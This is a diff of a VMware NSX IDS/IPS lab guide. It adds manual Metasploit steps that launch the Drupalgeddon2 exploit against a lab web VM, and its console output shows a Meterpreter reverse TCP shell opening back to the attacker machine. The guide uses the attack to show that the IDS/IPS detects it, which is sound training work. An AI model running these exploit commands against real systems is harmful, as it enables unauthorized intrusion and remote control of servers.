@@ -387,6 +387,8 @@ You have now successfully configured the NSX Distributed IDS/IPS ! In the next e
 ## Simple Attack Scenario
 **Estimated Time to Complete: 30 minutes**
 
+In this exercise, we will use **Metasploit** to launch a simple exploit against the **Drupal** service runnning on the **App1-WEB-TIER VM** and confirm the NSX Distributed IDS/IPS was able to detect this exploit attempt.
+
 **Confirm IP addressess of deployed VMs**
 1.	In the NSX Manager UI, navigate to Inventory -->  Virtual Machines
 2. Note the IP addresses for the 4 VMs that were deployed
@@ -405,10 +407,13 @@ You have now successfully configured the NSX Distributed IDS/IPS ! In the next e
     * Change this IP address if needed. 
     * Save your changes and exit **nano**
 4. Type **./attack1.sh** to initiate the Metasploit script and Drupalgeddon exploit. Next, go to step #6
-5.  **Alternatively**, to run the attack manually, type **msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit.
-
+5.  **Alternatively**, to run the attack manually, type **sudo msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
+    * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
+    * Type **set RHOST 192.168.10.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
+    * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
+    * Type **exploit** to initiate the exploit attempt
+    
 6. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
-
 
 ```console
 vmware@ubuntu:~$ ./attack1.sh
@@ -428,7 +433,7 @@ I love shells --egypt
 + -- --=[ 562 payloads - 45 encoders - 10 nops            ]
 + -- --=[ 7 evasion                                       ]
 
-Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it wit                        h setg RHOSTS x.x.x.x
+Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x
 
 [*] Processing attack1.rc for ERB directives.
 resource (attack1.rc)> use exploit/unix/webapp/drupal_drupalgeddon2
@@ -440,7 +445,7 @@ RPORT => 8080
 resource (attack1.rc)> exploit
 [*] Started reverse TCP handler on 10.114.209.151:4444
 [*] Sending stage (38288 bytes) to 192.168.10.100
-[*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.100:45032) a                        t 2020-07-20 19:37:29 -0500
+[*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.100:45032) at 2020-07-20 19:37:29 -0500
 
 ```
 
